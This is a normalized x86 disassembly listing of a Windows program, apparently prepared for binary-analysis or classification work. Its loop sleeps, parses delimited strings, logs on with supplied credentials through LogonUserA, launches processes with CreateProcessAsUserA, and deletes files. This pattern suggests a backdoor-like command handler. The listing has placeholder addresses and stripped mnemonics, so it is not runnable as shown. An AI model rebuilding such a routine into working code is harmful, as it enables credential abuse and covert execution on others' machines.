lea ecx [ ebp - 0x48c0 ]
call sub_4063b0
jmp r-xdata
push 0x4e20
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov [ ebp - 0x4a54 ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov [ ebp - 0x4a4c ] ecx
cmp [ ebp - 0x4a4c ] 0x0
jne r-xdata
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push 0x0
push rw-data
lea ecx [ ebp - 0x28 ]
call sub_406320
mov [ ebp - 0x4a3c ] eax
cmp [ ebp - 0x4a3c ] 0x0
je r-xdata
call 0x410117af
add [ ebx - 0x3fcc0037 ] al
jmp r-xdata
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x49d4 ] ecx
mov ecx [ ebp - 0x49d4 ]
add ecx 0x2
xor eax eax
mov edi [ ebp - 0x2768 ]
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x49d8 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4920 ]
push ecx
mov ecx rw-data
call sub_4082e0
mov edx 0x1
test edx edx
je r-xdata
push 0x4e20
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edi [ ebp - 0x2704 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x2708 ] ecx
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x2700 ]
add edx [ ebp - 0x253c ]
mov eax [ ebp - 0x2704 ]
add eax [ ebp - 0x253c ]
mov cl [ eax ]
mov [ edx ] cl
jmp r-xdata
lea edx [ ebp - 0x2550 ]
push edx
push 0x0
push 0x0
push sub_404fa0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0xb8 ] eax
cmp [ ebp - 0xb8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push edx
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
lea ecx [ ebp - 0x48d0 ]
push ecx
mov ecx rw-data
call sub_4082e0
push 0x1
lea ecx [ ebp - 0x48d0 ]
call sub_4063b0
jmp r-xdata
push 0x4e20
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x4bdc ] ecx
mov [ ebp - 0x4bdc ] r--data
jmp r-xdata
mov edx [ ebp - 0x4a54 ]
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov eax [ ebp - 0x4a54 ]
cmp eax [ ebp - 0x20 ]
ja r-xdata
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x4ba0 ] ecx
mov [ ebp - 0x4ba0 ] r--data
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x491c ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x48c ] 0x0
jne r-xdata
mov edx [ ebp - 0x2708 ]
add edx 0x1
mov [ ebp - 0x270c ] edx
jmp r-xdata
mov ecx [ ebp - 0x2704 ]
add ecx [ ebp - 0x2708 ]
movsx edx [ ecx ]
cmp edx 0x2d
je r-xdata
jmp r-xdata
mov [ rw-data ] 0x1
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
lea ecx [ ebp - 0x48e0 ]
push ecx
mov ecx rw-data
call sub_4082e0
push 0x1
lea ecx [ ebp - 0x48e0 ]
call sub_4063b0
jmp r-xdata
push 0x4e20
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
mov edi [ ebp - 0x4bdc ]
lea edx [ ebp - 0x27cc ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x27cc ]
push ecx
call sub_405430
add esp 0x4
jmp r-xdata
mov eax [ r--data ]
mov [ ebp - 0x4a50 ] eax
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x4a54 ]
mov [ ebp - 0x4a40 ] eax
mov ecx [ ebp - 0x4a4c ]
cmp ecx [ ebp - 0x4a40 ]
ja r-xdata
mov ecx [ ebp - 0x4a54 ]
mov [ ebp - 0x4a50 ] ecx
jmp r-xdata
mov eax [ ebp - 0x2768 ]
push eax
call sub_405400
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edi rw-data
mov edx [ ebp - 0x2768 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebp - 0x49d8 ]
sub edx 0x8
push edx
mov eax [ ebp - 0x4ba0 ]
add eax 0x8
push eax
mov ecx [ ebp - 0x2768 ]
push ecx
call strncpy
add esp 0xc
cmp [ ebp - 0x480 ] 0x1
jne r-xdata
mov [ ebp - 0x491c ] 0x0
mov [ ebp - 0x4918 ] 0x0
mov [ ebp - 0x4914 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x491c ]
xor ecx ecx
mov cl [ eax - 0x1 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x48c ] 0x0
mov [ ebp - 0x488 ] 0x0
mov [ ebp - 0x484 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x48c ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov edi [ ebp - 0x2704 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x270c ] ecx
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x2708 ]
sub eax [ ebp - 0x253c ]
mov ecx [ ebp - 0x2704 ]
add ecx [ ebp - 0x2708 ]
mov edx [ ebp - 0x2760 ]
mov cl [ ecx ]
mov [ edx + eax - 0x1 ] cl
jmp r-xdata
mov edx [ ebp - 0x253c ]
add edx 0x1
mov [ ebp - 0x253c ] edx
lea ecx [ ebp - 0x48f0 ]
push ecx
mov ecx rw-data
call sub_4082e0
push 0x1
lea ecx [ ebp - 0x48f0 ]
call sub_4063b0
jmp r-xdata
push 0x4e20
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
mov [ ebp - 0x4a6c ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov [ ebp - 0x4a64 ] ecx
cmp [ ebp - 0x4a64 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4a4c ]
sub edx 0x1
mov eax [ ebp - 0x4a40 ]
sub eax edx
mov [ ebp - 0x4a40 ] eax
mov ecx [ ebp - 0x24 ]
add ecx [ ebp - 0x4a54 ]
mov [ ebp - 0x4a48 ] ecx
jmp r-xdata
cmp [ ebp - 0x4a50 ] 0x0
jne r-xdata
mov [ rw-data ] 0x1
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4914 ]
add ecx 0x2
mov [ ebp - 0x49cc ] ecx
mov edx [ ebp - 0x491c ]
sub edx 0x1
mov [ ebp - 0x49c8 ] edx
mov eax [ ebp - 0x49c8 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x491c ]
xor eax eax
mov al [ edx - 0x1 ]
cmp eax 0xff
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x2d0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x484 ]
add eax 0x2
mov [ ebp - 0x49bc ] eax
mov ecx [ ebp - 0x48c ]
sub ecx 0x1
mov [ ebp - 0x49b8 ] ecx
mov edx [ ebp - 0x49b8 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x48c ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov edx [ ebp - 0x270c ]
add edx 0x1
mov [ ebp - 0x2754 ] edx
jmp r-xdata
mov ecx [ ebp - 0x2704 ]
add ecx [ ebp - 0x270c ]
movsx edx [ ecx ]
cmp edx 0x2d
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4a6c ]
cmp ecx [ ebp - 0x20 ]
jae r-xdata
mov edx [ ebp - 0x4a6c ]
cmp edx [ ebp - 0x20 ]
ja r-xdata
mov edx [ ebp - 0x4a40 ]
push edx
movsx eax [ rw-data ]
push eax
mov ecx [ ebp - 0x4a48 ]
push ecx
call memchr
add esp 0xc
mov [ ebp - 0x4a44 ] eax
cmp [ ebp - 0x4a44 ] 0x0
je r-xdata
mov edx [ ebp - 0x2768 ]
push edx
call free
add esp 0x4
mov [ ebp - 0x2768 ] 0x0
mov [ rw-data ] 0x0
push 0x0
mov edx [ ebp - 0xb8 ]
push edx
call [ TerminateThread@IAT ]
mov [ ebp - 0xb8 ] 0x0
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push rw-data
call [ DeleteFileA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
lea ecx [ ebp - 0x4930 ]
push ecx
mov ecx rw-data
call sub_4082e0
mov edx 0x1
test edx edx
je r-xdata
push 0x4e20
call [ Sleep@IAT ]
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x491c ]
sub ecx 0x1
mov [ ebp - 0x4b9c ] ecx
mov edx [ ebp - 0x4b9c ]
mov al [ edx ]
sub al 0x1
mov ecx [ ebp - 0x4b9c ]
mov [ ecx ] al
mov [ ebp - 0x2d0 ] 0x0
mov [ ebp - 0x2cc ] 0x0
mov [ ebp - 0x2c8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x2d0 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x48c ]
sub eax 0x1
mov [ ebp - 0x4b94 ] eax
mov ecx [ ebp - 0x4b94 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4b94 ]
mov [ eax ] dl
mov edi [ ebp - 0x2704 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x2754 ] ecx
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x270c ]
sub eax [ ebp - 0x2708 ]
mov ecx [ ebp - 0x2704 ]
add ecx [ ebp - 0x270c ]
mov edx [ ebp - 0x2758 ]
mov cl [ ecx ]
mov [ edx + eax - 0x1 ] cl
jmp r-xdata
mov eax [ ebp - 0x2708 ]
add eax 0x1
mov [ ebp - 0x2708 ] eax
mov eax [ r--data ]
mov [ ebp - 0x4a68 ] eax
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x4a6c ]
mov [ ebp - 0x4a58 ] edx
mov eax [ ebp - 0x4a64 ]
cmp eax [ ebp - 0x4a58 ]
ja r-xdata
mov eax [ ebp - 0x4a6c ]
mov [ ebp - 0x4a68 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4a4c ]
mov edi rw-data
mov esi [ ebp - 0x4a44 ]
xor edx edx
mov [ ebp - 0x4bd4 ] edx
[ esi ] [ edi ]
je r-xdata
lea ecx [ ebp - 0x4940 ]
push ecx
mov ecx rw-data
call sub_4082e0
mov edx 0x1
test edx edx
je r-xdata
push 0x4e20
call [ Sleep@IAT ]
mov ecx 0x1
test ecx ecx
je r-xdata
jmp r-xdata
cmp [ ebp - 0x492c ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x2530 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2c8 ]
add eax 0x2
mov [ ebp - 0x49c4 ] eax
mov ecx [ ebp - 0x2d0 ]
sub ecx 0x1
mov [ ebp - 0x49c0 ] ecx
mov edx [ ebp - 0x49c0 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x2d0 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov eax rw-data
mov ecx [ ebp - 0x2758 ]
mov edx [ ecx ]
cmp edx [ eax ]
jne r-xdata
mov ecx [ ebp - 0x2754 ]
sub ecx [ ebp - 0x270c ]
mov edx [ ebp - 0x2704 ]
add edx [ ebp - 0x2754 ]
mov eax [ ebp - 0x26fc ]
mov dl [ edx ]
mov [ eax + ecx - 0x1 ] dl
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4a84 ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov [ ebp - 0x4a7c ] ecx
cmp [ ebp - 0x4a7c ] 0x0
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4a64 ]
sub ecx 0x1
mov edx [ ebp - 0x4a58 ]
sub edx ecx
mov [ ebp - 0x4a58 ] edx
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x4a6c ]
mov [ ebp - 0x4a60 ] eax
jmp r-xdata
cmp [ ebp - 0x4a68 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4bd4 ]
mov [ ebp - 0x4bd8 ] ecx
cmp [ ebp - 0x4bd8 ] 0x0
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x4bd4 ] eax
jmp r-xdata
cmp [ ebp - 0x493c ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x2530 ] 0x0
jne r-xdata
mov [ ebp - 0x492c ] 0x0
mov [ ebp - 0x4928 ] 0x0
mov [ ebp - 0x4924 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x492c ]
xor ecx ecx
mov cl [ eax - 0x1 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x2530 ] 0x0
mov [ ebp - 0x252c ] 0x0
mov [ ebp - 0x2528 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x2530 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2d0 ]
sub eax 0x1
mov [ ebp - 0x4b98 ] eax
mov ecx [ ebp - 0x4b98 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4b98 ]
mov [ eax ] dl
mov edx rw-data
mov eax [ ebp - 0x2760 ]
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
mov ecx [ ebp - 0x2758 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
mov eax [ ebp - 0x2754 ]
add eax 0x1
mov [ ebp - 0x2754 ] eax
mov eax [ ebp - 0x270c ]
add eax 0x1
mov [ ebp - 0x270c ] eax
mov ecx [ ebp - 0x4a84 ]
cmp ecx [ ebp - 0x20 ]
jae r-xdata
mov edx [ ebp - 0x4a84 ]
cmp edx [ ebp - 0x20 ]
ja r-xdata
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x4be8 ] ecx
mov [ ebp - 0x4be8 ] r--data
jmp r-xdata
mov ecx [ ebp - 0x4a58 ]
push ecx
movsx edx [ rw-data ]
push edx
mov eax [ ebp - 0x4a60 ]
push eax
call memchr
add esp 0xc
mov [ ebp - 0x4a5c ] eax
cmp [ ebp - 0x4a5c ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4a44 ]
sub edx [ ebp - 0x24 ]
mov [ ebp - 0x4a50 ] edx
jmp r-xdata
mov [ ebp - 0x493c ] 0x0
mov [ ebp - 0x4938 ] 0x0
mov [ ebp - 0x4934 ] 0x0
mov eax [ ebp - 0x493c ]
xor ecx ecx
mov cl [ eax - 0x1 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x2530 ] 0x0
mov [ ebp - 0x252c ] 0x0
mov [ ebp - 0x2528 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x2530 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov edx rw-data
mov eax [ ebp - 0x2768 ]
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
mov ecx [ ebp - 0x4924 ]
add ecx 0x2
mov [ ebp - 0x4a08 ] ecx
mov edx [ ebp - 0x492c ]
sub edx 0x1
mov [ ebp - 0x4a04 ] edx
mov eax [ ebp - 0x4a04 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x492c ]
xor eax eax
mov al [ edx - 0x1 ]
cmp eax 0xff
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2528 ]
add eax 0x2
mov [ ebp - 0x49e0 ] eax
mov ecx [ ebp - 0x2530 ]
sub ecx 0x1
mov [ ebp - 0x49dc ] ecx
mov edx [ ebp - 0x49dc ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x2530 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
lea ecx [ ebp - 0x2764 ]
push ecx
push 0x0
push 0x2
mov edx [ ebp - 0x2760 ]
push edx
mov eax [ ebp - 0x2758 ]
push eax
mov ecx [ ebp - 0x2700 ]
push ecx
call [ LogonUserA@IAT ]
mov [ ebp - 0x275c ] eax
mov edx [ ebp - 0x2700 ]
push edx
call free
add esp 0x4
mov eax [ ebp - 0x2760 ]
push eax
call free
add esp 0x4
mov ecx [ ebp - 0x2758 ]
push ecx
call free
add esp 0x4
mov edx [ ebp - 0x2704 ]
push edx
call free
add esp 0x4
mov [ ebp - 0x2700 ] 0x0
mov [ ebp - 0x2760 ] 0x0
mov [ ebp - 0x2758 ] 0x0
mov [ ebp - 0x2704 ] 0x0
cmp [ ebp - 0x275c ] 0x0
jne r-xdata
xor edx edx
mov eax [ ebp - 0x2760 ]
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov eax [ r--data ]
mov [ ebp - 0x4a80 ] eax
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x4a84 ]
mov [ ebp - 0x4a70 ] edx
mov eax [ ebp - 0x4a7c ]
cmp eax [ ebp - 0x4a70 ]
ja r-xdata
mov eax [ ebp - 0x4a84 ]
mov [ ebp - 0x4a80 ] eax
jmp r-xdata
mov edi [ ebp - 0x4be8 ]
lea edx [ ebp - 0x2830 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x2830 ]
push ecx
call sub_405c90
add esp 0x4
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4a64 ]
mov edi rw-data
mov esi [ ebp - 0x4a5c ]
xor edx edx
mov [ ebp - 0x4be0 ] edx
[ esi ] [ edi ]
je r-xdata
mov edx [ ebp - 0x4a44 ]
sub edx [ ebp - 0x4a48 ]
add edx 0x1
mov eax [ ebp - 0x4a40 ]
sub eax edx
mov [ ebp - 0x4a40 ] eax
mov ecx [ ebp - 0x4a44 ]
add ecx 0x1
mov [ ebp - 0x4a48 ] ecx
mov ecx [ ebp - 0x4934 ]
add ecx 0x2
mov [ ebp - 0x4a38 ] ecx
mov edx [ ebp - 0x493c ]
sub edx 0x1
mov [ ebp - 0x4a34 ] edx
mov eax [ ebp - 0x4a34 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x493c ]
xor eax eax
mov al [ edx - 0x1 ]
cmp eax 0xff
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2528 ]
add eax 0x2
mov [ ebp - 0x4a10 ] eax
mov ecx [ ebp - 0x2530 ]
sub ecx 0x1
mov [ ebp - 0x4a0c ] ecx
mov edx [ ebp - 0x4a0c ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x2530 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov ecx [ ebp - 0x492c ]
sub ecx 0x1
mov [ ebp - 0x4bb8 ] ecx
mov edx [ ebp - 0x4bb8 ]
mov al [ edx ]
sub al 0x1
mov ecx [ ebp - 0x4bb8 ]
mov [ ecx ] al
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x10 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2530 ]
sub eax 0x1
mov [ ebp - 0x4ba4 ] eax
mov ecx [ ebp - 0x4ba4 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4ba4 ]
mov [ eax ] dl
lea edx [ ebp - 0x26f8 ]
push edx
lea eax [ ebp - 0x2750 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x26fc ]
push ecx
push 0x0
mov edx [ ebp - 0x2764 ]
push edx
call [ CreateProcessAsUserA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
mov [ ebp - 0x4acc ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov [ ebp - 0x4ac4 ] ecx
cmp [ ebp - 0x4ac4 ] 0x0
jne r-xdata
call sub_406910
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4a7c ]
sub ecx 0x1
mov edx [ ebp - 0x4a70 ]
sub edx ecx
mov [ ebp - 0x4a70 ] edx
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x4a84 ]
mov [ ebp - 0x4a78 ] eax
jmp r-xdata
cmp [ ebp - 0x4a80 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4be0 ]
mov [ ebp - 0x4be4 ] ecx
cmp [ ebp - 0x4be4 ] 0x0
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x4be0 ] eax
mov ecx [ ebp - 0x493c ]
sub ecx 0x1
mov [ ebp - 0x4bd0 ] ecx
mov edx [ ebp - 0x4bd0 ]
mov al [ edx ]
sub al 0x1
mov ecx [ ebp - 0x4bd0 ]
mov [ ecx ] al
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x10 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2530 ]
sub eax 0x1
mov [ ebp - 0x4bbc ] eax
mov ecx [ ebp - 0x4bbc ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4bbc ]
mov [ eax ] dl
jmp r-xdata
cmp [ ebp - 0x51c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x2
mov [ ebp - 0x49e8 ] eax
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x49e4 ] ecx
mov edx [ ebp - 0x49e4 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
and eax 0xff
test eax eax
jne r-xdata
lea ecx [ ebp - 0x4900 ]
push ecx
mov ecx rw-data
call sub_4082e0
push 0x1
lea ecx [ ebp - 0x4900 ]
call sub_4063b0
jmp r-xdata
push 0x4e20
call [ Sleep@IAT ]
push 0x1
lea ecx [ ebp - 0x2534 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x520 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x490 ]
call sub_4063b0
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_4063b0
jmp r-xdata
mov ecx [ ebp - 0x4acc ]
cmp ecx [ ebp - 0x20 ]
jae r-xdata
mov edx [ ebp - 0x4acc ]
cmp edx [ ebp - 0x20 ]
ja r-xdata
lea ecx [ ebp - 0x4950 ]
push ecx
mov ecx rw-data
call sub_4082e0
mov edx 0x1
test edx edx
je r-xdata
push 0x4e20
call [ Sleep@IAT ]
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4a70 ]
push ecx
movsx edx [ rw-data ]
push edx
mov eax [ ebp - 0x4a78 ]
push eax
call memchr
add esp 0xc
mov [ ebp - 0x4a74 ] eax
cmp [ ebp - 0x4a74 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4a5c ]
sub edx [ ebp - 0x24 ]
mov [ ebp - 0x4a68 ] edx
